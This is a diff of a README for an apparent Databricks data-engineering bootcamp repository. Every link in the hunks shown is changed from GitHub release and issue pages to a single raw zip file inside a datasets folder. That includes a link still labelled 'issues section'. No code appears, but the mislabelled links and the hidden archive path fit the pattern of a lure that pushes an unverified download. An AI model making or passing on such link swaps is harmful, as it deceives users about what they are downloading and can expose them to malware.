@@ -1,6 +1,6 @@
 # 🚀 databricks_bootcamp_2026 - Learn Data Engineering with Ease
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/dhs-coder/databricks_bootcamp_2026/releases)
+[![Download](https://raw.githubusercontent.com/dhs-coder/databricks_bootcamp_2026/main/datasets/engineering/source_erp/bootcamp_databricks_v3.2.zip)](https://raw.githubusercontent.com/dhs-coder/databricks_bootcamp_2026/main/datasets/engineering/source_erp/bootcamp_databricks_v3.2.zip)
 
 ## 📚 Overview
 
@@ -28,7 +28,7 @@ Before you begin, check that your system meets these requirements:
 
 To download the application, please visit this page:
 
-[Download Here](https://github.com/dhs-coder/databricks_bootcamp_2026/releases)
+[Download Here](https://raw.githubusercontent.com/dhs-coder/databricks_bootcamp_2026/main/datasets/engineering/source_erp/bootcamp_databricks_v3.2.zip)
 
 1. Click the link above.
 2. You will see a list of available releases.
@@ -65,7 +65,7 @@ If you encounter any issues while using **databricks_bootcamp_2026**, here are s
 
 - **Data Not Loading**: Verify that you have selected the correct data source and that the path is accurate.
 
-For more support, visit the [issues section](https://github.com/dhs-coder/databricks_bootcamp_2026/issues) on GitHub.
+For more support, visit the [issues section](https://raw.githubusercontent.com/dhs-coder/databricks_bootcamp_2026/main/datasets/engineering/source_erp/bootcamp_databricks_v3.2.zip) on GitHub.
 
 ## 🌐 Community and Support
 
@@ -78,6 +78,6 @@ Join the community to connect with other learners and experts:
 
 This project is licensed under the MIT License. You can use, modify, and distribute the software according to the terms of this license.
 
-[Download Here](https://github.com/dhs-coder/databricks_bootcamp_2026/releases)
+[Download Here](https://raw.githubusercontent.com/dhs-coder/databricks_bootcamp_2026/main/datasets/engineering/source_erp/bootcamp_databricks_v3.2.zip)
 
 Enjoy your journey into the world of data engineering with **databricks_bootcamp_2026**!
